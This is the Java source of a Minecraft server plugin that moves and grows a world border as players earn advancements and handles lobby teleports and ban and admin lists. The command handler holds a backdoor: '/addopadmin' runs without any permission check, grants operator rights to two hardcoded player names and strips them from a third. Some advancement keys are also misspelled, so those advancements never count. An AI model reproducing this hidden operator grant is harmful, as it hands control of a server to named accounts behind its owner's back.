package org.example1.etherexp;

import com.onarandombox.MultiversePortals.MVPortal;
import com.onarandombox.MultiversePortals.event.MVPortalEvent;
import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import com.onarandombox.MultiverseCore.MultiverseCore;
import com.onarandombox.MultiverseCore.api.MultiverseWorld;
import org.jetbrains.annotations.NotNull;

import java.util.*;

public final class EtherExp extends JavaPlugin implements Listener {
    private int worldBorderSize = 10;
    private double radius = 10;
    private double angle = 0;
    private double change_radius = 0.1;
    private double change_angle = 0.0017;
    private double change_angle_advancement = 0.0005;
    private double xLobby = 9.606411547450097;
    private double yLobby = 7.0;
    private double zLobby = 26.573462861292374;
    private float yawLobby = -180;
    private float pitchLobby = 0;
    private final List<String> nameBan = new ArrayList<>();
    private final List<String> nameAdmin = new ArrayList<>();

    private static final List<String> advancementsList = Arrays.asList(
            "story/root",
            "story/mine_stone",
            "story/upgrade_tools",
            "story/smelt_iron",
            "story/obtain_armor",
            "story/lava_bucket",
            "story/iron_tools",
            "story/deflect_arrow",
            "story/form_obsidian",
            "story/mine_diamond",
            "story/enter_the_nether",
            "story/shiny_gear",
            "story/enchant_item",
            "story/cure_zombie_villager",
            "story/follow_ender_eye",
            "story/enter_the_end",
            "neither/root",
            "neither/return_to_sender",
            "nether/find_bastion",
            "nether/obtain_ancient_debris",
            "nether/fast_travel",
            "neither/find_fortress",
            "nether/obtain_crying_obsidian",
            "nether/distract_piglin",
            "nether/ride_strider",
            "nether/uneasy_alliance",
            "nether/loot_bastion",
            "neither/use_lodestone",
            "nether/netherite_armor",
            "nether/get_wither_skull",
            "nether/obtain_blaze_rod",
            "nether/charge_respawn_anchor",
            "nether/ride_strider_in_overworld_lava",
            "nether/explore_nether",
            "nether/summon_wither",
            "nether/brew_potion",
            "neither/create_beacon",
            "nether/all_options",
            "nether/create_full_beacon",
            "nether/all_effects",
            "end/root",
            "end/kill_dragon",
            "end/dragon_egg",
            "end/enter_end_gateway",
            "end/respawn_dragon",
            "end/dragon_breath",
            "end/find_end_city",
            "end/elytra",
            "end/levitate",
            "adventure/root",
            "adventure/voluntary_exile",
            "adventure/spyglass_at_parrot",
            "adventure/kill_a_mob",
            "adventure/read_power_of_chiseled_bookshelf",
            "adventure/trade",
            "adventure/trim_with_any_armor_pattern",
            "adventure/honey_block_slide",
            "adventure/ol_betsy",
            "adventure/lightning_rod_with_villager_no_fire",
            "adventure/fall_from_world_height",
            "adventure/salvage_sherd",
            "adventure/avoid_vibration",
            "adventure/sleep_in_bed",
            "adventure/hero_of_the_village",
            "adventure/spyglass_at_ghost",
            "adventure/throw_trident",
            "adventure/kill_mob_near_sculk_catalyst",
            "adventure/shoot_arrow",
            "adventure/kill_all_mobs",
            "adventure/totem_of_undying",
            "adventure/summon_iron_golem",
            "adventure/trade_at_world_height",
            "adventure/trim_with_all_exclusive_armor_patterns",
            "adventure/two_birds_one_arrow",
            "adventure/whos_the_pillager_now",
            "adventure/arbalistic",
            "adventure/craft_decorated_pot_using_only_sherds",
            "adventure/adventuring_time",
            "adventure/play_jukebox_in_meadows",
            "adventure/walk_on_powder_snow_with_leather_boots",
            "adventure/spyglass_at_dragon",
            "adventure/very_very_frightening",
            "adventure/sniper_duel",
            "adventure/bullseye",
            "husbandry/root",
            "husbandry/safely_harvest_honey",
            "husbandry/breed_an_animal",
            "husbandry/allay_deliver_item_to_player",
            "husbandry/ride_a_boat_with_a_goat",
            "husbandry/tame_an_animal",
            "husbandry/make_a_sign_glow",
            "husbandry/fishy_business",
            "husbandry/silk_touch_nest",
            "husbandry/tadpole_in_a_bucket",
            "husbandry/obtain_sniffer_egg",
            "husbandry/plant_seed",
            "husbandry/wax_on",
            "husbandry/bred_all_animals",
            "husbandry/allay_deliver_cake_to_note_block",
            "husbandry/complete_catalogue",
            "husbandry/tactical_fishing",
            "husbandry/leash_all_frog_variants",
            "husbandry/feed_snifflet",
            "husbandry/balanced_diet",
            "husbandry/obtain_netherite_hoe",
            "husbandry/wax_off",
            "husbandry/axolotl_in_a_bucket",
            "husbandry/froglights",
            "husbandry/plant_any_sniffer_seed",
            "husbandry/kill_axolotl_target"
    );

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        initCommand();
        new BukkitRunnable() {
            @Override
            public void run() {
                setCenterBorder();
            }
        }.runTaskTimer(this, 0, 10);
        try {
            nameAdmin.add("PavelDurov");
            nameAdmin.add("Mattstar");
            nameAdmin.add("Reqwenx");
        } catch (Exception e) {
            sendErrorMessage(e, 163);
        }
    }

    @EventHandler
    public void onPlayerPortal(MVPortalEvent event) {
        try {
            Player player = event.getTeleportee();
            MVPortal portal = event.getSendingPortal();
            System.out.println("Игрок " + player.getName() + " зашел в портал " + event.getTeleportee().getName());
            sendMessageAdmin("Игрок " + player.getName() + " зашел в портал " + event.getTeleportee().getName());
            if (Objects.equals(portal.getName(), "portal1")) teleportToWorld(player);
        } catch (Exception e) {
            sendErrorMessage(e, 175);
        }
    }

    private void initCommand() {
        String[] commands = {
                "setBorderRadius", "setBorderAngle", "resetBorderAngle", "resetBorderRadius", "getworld",
                "penis", "lobby", "hub", "setlobby", "resetlobby", "addtobanlist", "removetobanlist",
                "addtoadminlist", "removetoadminlist", "addOpAdmin", "setchangeangle"
        };
        try {
            for (String name : commands) Objects.requireNonNull(getCommand(name)).setExecutor(this);
        } catch (Exception e) {
            sendErrorMessage(e, 187);
        }
    }

    private static void sendErrorMessage(Exception e, int string) {
        System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: " + string);
    }

    @EventHandler
    public void onAdvancementDone(PlayerAdvancementDoneEvent event) {
        try {
            String advancementName = event.getAdvancement().getKey().getKey();
            World world = getWorldCast("world");
            assert world != null;
            WorldBorder worldBorder = world.getWorldBorder();
            if (advancementsList.contains(advancementName)) {
                worldBorderSize = (int) (Math.ceil(worldBorder.getSize() / 10) * 10) + 10;
                this.change_angle += change_angle_advancement;
                expandWorldBorder(worldBorder, worldBorderSize);
                for (Player player : world.getPlayers())
                    player.sendMessage(ChatColor.YELLOW + "Пространство расширяется. " + "Текущее значение барьера: " + worldBorderSize);
                System.out.println("Текущее значение барьера: " + worldBorderSize);
            }
        } catch (Exception e) {
            sendErrorMessage(e, 211);
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        Player player = event.getPlayer();
        try {
            killBanPlayer(player);
        } catch (Exception e) {
            sendErrorMessage(e, 220);
        }
    }

    private void killBanPlayer(Player player) {
        if (nameBan.contains(player.getName())) {
            if (player.getHealth() >= 0.5)
                player.setHealth(player.getHealth() - 0.5);
            else player.setHealth(0.0);
            if (player.isOp()) player.setOp(false);
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        try {
            teleportToLobby(event.getPlayer());
        } catch (Exception e) {
            sendErrorMessage(e, 239);
        }
    }

    private void teleportToLobby(Player player) {
        try {
            World worldLobby = getWorldCast("lobby");
            Location lobbyLocation = new Location(worldLobby, xLobby, yLobby, zLobby, yawLobby, pitchLobby);
            player.teleport(lobbyLocation);
            player.sendMessage(ChatColor.AQUA + "Вы были телепортированы в лобби!");
            System.out.println("Игрок " + player.getName() + " телепортирован в лобби");
        } catch (Exception e) {
            sendErrorMessage(e, 251);
        }
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String[] split = event.getMessage().split(" ");
        Player player = event.getPlayer();
        if (player.isOp()) {
            switch (split[0].toLowerCase()) {
                case "/setborderradius":
                    if (split.length == 2) changeRadius(player, Double.parseDouble(split[1]));
                    else player.sendMessage("Использование: /setborderradius <радиус>");
                    break;
                case "/setborderangle":
                    if (split.length == 2) changeAngle(player, Double.parseDouble(split[1]));
                    else player.sendMessage("Использование: /setborderangle <угол>");
                    break;
                case "/resetborderangle":
                    resetBorderAngle();
                    break;
                case "/resetborderradius":
                    resetBorderRadius();
                    break;
                case "/getworld":
                    if (split.length == 2) getWorldCommand(event, split);
                    else player.sendMessage("Использование: /getworld <имя_мира>");
                    break;
                case "/setlobby":
                    setLobbyCommand(player);
                    break;
                case "/resetlobby":
                    resetLobbyCommand(player);
                    break;
                case "/addtobanlist":
                    if (split.length == 2) addToBanList(split);
                    else player.sendMessage("Использование: /addtobanlist <ник>");
                    break;
                case "/removetobanlist":
                    if (split.length == 2) removeToBanList(split);
                    else player.sendMessage("Использование: /removetobanlist <ник>");
                    break;
                case "/addtoadminlist":
                    if (split.length == 2) addToAdminList(split);
                    else player.sendMessage("Использование: /addtoadminlist <ник>");
                    break;
                case "/removetoadminlist":
                    if (split.length == 2) removeToAdminList(split);
                    else player.sendMessage("Использование: /removetoadminlist <ник>");
                    break;
                case "/setchangeangle":
                    if (split.length == 2) setChangeAngleAdv(split, player);
                    else player.sendMessage("Использование: /setchangeangle <значение>");
                    break;
                default:
                    break;
            }
        }else if (
                split[0].equalsIgnoreCase("/resetlobby") || split[0].equalsIgnoreCase("/setlobby") || split[0].equalsIgnoreCase("/getworld") ||
                        split[0].equalsIgnoreCase("/resetBorderRadius") || split[0].equalsIgnoreCase("/resetBorderAngle") ||
                        split[0].equalsIgnoreCase("/setBorderAngle") || split[0].equalsIgnoreCase("/setBorderRadius") ||
                        split[0].equalsIgnoreCase("/addtobanlist") || split[0].equalsIgnoreCase("/removetobanlist") ||
                        split[0].equalsIgnoreCase("/addtoadminlist") || split[0].equalsIgnoreCase("/removetoadminlist")
        ) player.sendMessage(ChatColor.RED + "Недостаточно прав!");
        switch (split[0].toLowerCase()){
            case "/penis":
                if(!player.getWorld().getName().equals("world")) teleportToWorld(player);
                break;
            case "/lobby":
            case "/hub":
                teleportToLobby(player);
                break;
            case "/addopadmin":
                Player player1 = getPlayerByName("Mattstar");
                Player player2 = getPlayerByName("ReqwenX");
                Player player3 = getPlayerByName("PavelDurov");
                if (player1 != null && !player1.isOp()) player1.setOp(true);
                if (player2 != null && !player2.isOp()) player2.setOp(true);
                if (player3 != null) player3.setOp(false);
                break;
            default:
                break;
        }
    }

    private void setChangeAngleAdv(String[] split, Player player) {
        double new_change_angle = Double.parseDouble(split[1]);
        change_angle_advancement = new_change_angle;
        player.sendMessage("Приращение угла изменено на " + new_change_angle);
    }

    private void removeToBanList(String[] split) {
        try {
            String namePlayer = split[1];
            nameBan.remove(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 339);
        }
    }

    private void addToBanList(String[] split) {
        try {
            String namePlayer = split[1];
            nameBan.add(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 348);
        }
    }

    private void addToAdminList(String[] split) {
        try {
            String namePlayer = split[1];
            nameAdmin.add(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 357);
        }
    }

    private void removeToAdminList(String[] split) {
        try {
            String namePlayer = split[1];
            nameAdmin.remove(namePlayer);
        } catch (Exception e) {
            sendErrorMessage(e, 366);
        }
    }

    private void resetLobbyCommand(Player player) {
        try {
            xLobby = 9.606411547450097;
            yLobby = 7.0;
            zLobby = 26.573462861292374;
            yawLobby = -180;
            pitchLobby = 0;
            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
            System.out.println("EtherExp: Текущие координаты спавна: X: " + xLobby + " Y: " + yLobby + " Z: " + zLobby + " Yaw: " + yawLobby + " Pitch: " + pitchLobby);
        } catch (Exception e) {
            sendErrorMessage(e, 380);
        }
    }

    private void setLobbyCommand(Player player) {
        try {
            Location lobbyLocation = player.getLocation();
            xLobby = lobbyLocation.getX();
            yLobby = lobbyLocation.getY();
            zLobby = lobbyLocation.getZ();
            yawLobby = lobbyLocation.getYaw();
            pitchLobby = lobbyLocation.getPitch();
            player.sendMessage(ChatColor.AQUA + "Точка успешно установлена!");
            System.out.println("EtherExp: Текущие координаты спавна: X: " + lobbyLocation.getX() + " Y: " + lobbyLocation.getY() + " Z: " + lobbyLocation.getZ() + " Yaw: " + lobbyLocation.getYaw() + " Pitch: " + lobbyLocation.getPitch());
        } catch (Exception e) {
            sendErrorMessage(e, 395);
        }
    }

    private void getWorldCommand(PlayerCommandPreprocessEvent event, String[] split) {
        try {
            String nameWorld = split[1];
            World world = getWorldCast(nameWorld);
            if (world != null) event.getPlayer().sendMessage("Мир " + nameWorld + " успешно получен!");
            else event.getPlayer().sendMessage("Мир " + nameWorld + " не существует!");
        } catch (Exception e) {
            sendErrorMessage(e, 406);
        }
    }

    private void resetBorderAngle() {
        try {
            this.change_angle = 0.006;
            System.out.println("Текущее значение угла: " + 0.006);
        } catch (Exception e) {
            sendErrorMessage(e, 415);
        }
    }

    private void resetBorderRadius() {
        try {
            this.change_radius = 0.1;
            System.out.println("Текущее значение угла: " + 0.1);
        } catch (Exception e) {
            sendErrorMessage(e, 423);
        }
    }

    private void teleportToWorld(Player player) {
        try {
            String nameWorld = "world";
            World world = getWorldCast(nameWorld);
            sendMessageAdmin(ChatColor.AQUA + "Созидатель " + player.getName() + " пришел в этот мир!");
            if (world != null) {
                final Location newLocation = getLocationBorder(world);
                player.teleport(newLocation);
                System.out.println("EtherExp: Игрок " + player.getName() + " телепортирован в мир World");
            }
        } catch (Exception e) {
            sendErrorMessage(e, 438);
        }
    }

    public static Player getPlayerByName(String playerName) {
        for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
            if (onlinePlayer.getName().equalsIgnoreCase(playerName)) {
                return onlinePlayer;
            }
        }
        return null; // Если игрок не найден
    }

    @NotNull
    static Location getLocationBorder(World world) {
        Random random = new Random();
        final Location locationWorldBorder = world.getWorldBorder().getCenter();
        int maxValue = (int) (world.getWorldBorder().getSize() / 3);
        int minValue = -maxValue;
        final double x = locationWorldBorder.getX() + random.nextInt((maxValue - minValue) + 1) + minValue;
        final double z = locationWorldBorder.getZ() + random.nextInt((maxValue - minValue) + 1) + minValue;
        final double y = world.getHighestBlockYAt((int) x, (int) z);
        return new Location(world, x, y, z);
    }

    public World getWorldCast(String name) {
        // Получаем экземпляр MultiverseCore
        MultiverseCore multiverseCore = (MultiverseCore) Bukkit.getPluginManager().getPlugin("Multiverse-Core");
        // Проверяем, что MultiverseCore установлен
        if (multiverseCore == null) {
            // Обработка ошибки - MultiverseCore не установлен
            return null;
        }
        // Получаем мир (lobby) по его имени
        MultiverseWorld nameWorld = multiverseCore.getMVWorldManager().getMVWorld(name);
        // Проверяем, что мир найден
        if (nameWorld == null) {
            // Обработка ошибки - мир не найден
            return null;
        }
        // Возвращаем объект World
        return nameWorld.getCBWorld();
    }

    private void expandWorldBorder(WorldBorder worldBorder, int newWorldBorderSize) {
        worldBorder.setSize(newWorldBorderSize, 15);
    }

    private void changeAngle(Player player, double new_change_angle) {
        try {
            player.sendMessage("Установлено значение угла: " + new_change_angle);
            change_angle = new_change_angle;
            System.out.println("Текущее значение угла: " + change_angle);
        } catch (Exception e) {
            sendErrorMessage(e, 490);
        }
    }

    private void changeRadius(Player player, double new_change_radius) {
        try {
            player.sendMessage("Установлен радиус барьера: " + new_change_radius);
            change_radius = new_change_radius;
            System.out.println("Текущее значение радиуса: " + change_radius);
        } catch (Exception e) {
            sendErrorMessage(e, 499);
        }
    }


    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    private void setCenterBorder() {
        try {
            WorldBorder worldBorder = Bukkit.getWorlds().get(0).getWorldBorder();
            double newWorldBorderX = radius * Math.cos(angle);
            double newWorldBorderY = radius * Math.sin(angle);
            worldBorder.setCenter(newWorldBorderX, newWorldBorderY);
            radius += change_radius;
            angle += change_angle;
        } catch (Exception e) {
            sendErrorMessage(e, 518);
        }
    }

    private void sendMessageAdmin(String message) {
        try {
            for (String name : nameAdmin) {
                Player player = getPlayerByName(name);
                if (player != null)
                    player.sendMessage(message);
            }
        } catch (Exception e) {
            sendErrorMessage(e, 530);
        }
    }
}

